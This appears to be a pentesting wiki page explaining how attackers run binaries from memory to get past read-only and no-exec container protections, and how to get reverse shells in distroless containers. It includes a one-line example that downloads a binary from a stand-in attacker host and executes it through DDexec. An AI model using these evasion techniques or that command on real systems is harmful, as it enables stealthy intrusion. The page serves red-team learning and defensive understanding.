  \n\n## Videos\n\nIn the following videos you can find the techniques mentioned in this page explained more in depth:\n\n\
  - [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)\n\
  - [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)\n\
  \n## read-only / no-exec scenario\n\nIt's more and more common to find linux machines mounted with **read-only (ro) file\
  \ system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting\
  \ **`readOnlyRootFilesystem: true`** in the `securitycontext`:\n\n<pre class=\"language-yaml\"><code class=\"lang-yaml\"\
  >apiVersion: v1\nkind: Pod\nmetadata:\n  name: alpine-pod\nspec:\n  containers:\n  - name: alpine\n    image: alpine\n \
  \   securityContext:\n<strong>      readOnlyRootFilesystem: true\n</strong>    command: [\"sh\", \"-c\", \"while true; do\
  \ sleep 1000; done\"]\n</code></pre>\n\nHowever, even if the file system is mounted as ro, **`/dev/shm`** will still be\
  \ writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**,\
  \ so if you download a binary here you **won't be able to execute it**.\n\n> [!WARNING]\n> From a red team perspective,\
  \ this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators\
  \ like `kubectl`).\n\n## Easiest bypass: Scripts\n\nNote that I mentioned binaries, you can **execute any script** as long\
  \ as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python`\
  \ is installed.\n\nHowever, this isn't just enough to execute your binary backdoor or other binary tools you might need\
  \ to run.\n\n## Memory Bypasses\n\nIf you want to execute a binary but the file system isn't allowing that, the best way\
  \ to do so is by **executing it from memory**, as the **protections doesn't apply in there**.\n\n### FD + exec syscall bypass\n\
  \nIf you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download\
  \ the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to\
  \ be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.\n\n\
  For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass\
  \ it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with\
  \ the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the\
  \ **exec** syscall to run it.\n\n> [!WARNING]\n> This doesn't work in other scripting languages like PHP or Node because\
  \ they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to\
  \ create the **memory fd** to store the binary.\n>\n> Moreover, creating a **regular fd** with a file in `/dev/shm` won't\
  \ work, as you won't be allowed to run it because the **no-exec protection** will apply.\n\n### DDexec / EverythingExec\n\
  \n[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory\
  \ your own process** by overwriting its **`/proc/self/mem`**.\n\nTherefore, **controlling the assembly code** that is being\
  \ executed by the process, you can write a **shellcode** and \"mutate\" the process to **execute any arbitrary code**.\n\
  \n> [!TIP]\n> **DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary**\
  \ from **memory**.\n\n```bash\n# Basic example\nwget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0\
  \ foo bar\n```\n\nFor more information about this technique check the Github or:\n\n\n{{#ref}}\nddexec.md\n{{#endref}}\n\
  \n### MemExec\n\n[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode\
  \ demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just\
  \ run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and\
  \ run**.\n\nYou can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).\n\
  \n### Memdlopen\n\nWith a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows\
  \ an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.\n\
  \n## Distroless Bypass\n\nFor a dedicated explanation of **what distroless actually is**, when it helps, when it does not,\
  \ and how it changes post-exploitation tradecraft in containers, check:\n\n{{#ref}}\n../../privilege-escalation/container-security/distroless.md\n\
  {{#endref}}\n\n### What is distroless\n\nDistroless containers contain only the **bare minimum components necessary to run\
  \ a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a\
  \ package manager, shell, or system utilities.\n\nThe goal of distroless containers is to **reduce the attack surface of\
  \ containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.\n\
  \n### Reverse Shell\n\nIn a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You\
  \ won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.\n\n> [!WARNING]\n\
  > Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.\n\nHowever,\
  \ if the compromised container is running for example a flask web, then python is installed, and therefore you can grab\
  \ a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting\
  \ language**.\n\n> [!TIP]\n> Using the scripting language you could **enumerate the system** using the language capabilities.\n\
  \nIf there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your\
  \ binaries** and **execute** them.\n\n> [!TIP]\n> However, in this kind of containers these protections will usually exist,\
  \ but you could use the **previous memory execution techniques to bypass them**.\n\nYou can find **examples** on how to\
  \ **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in\
  \ [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).\n\n\n{{#include ../../../banners/hacktricks-training.md}}"
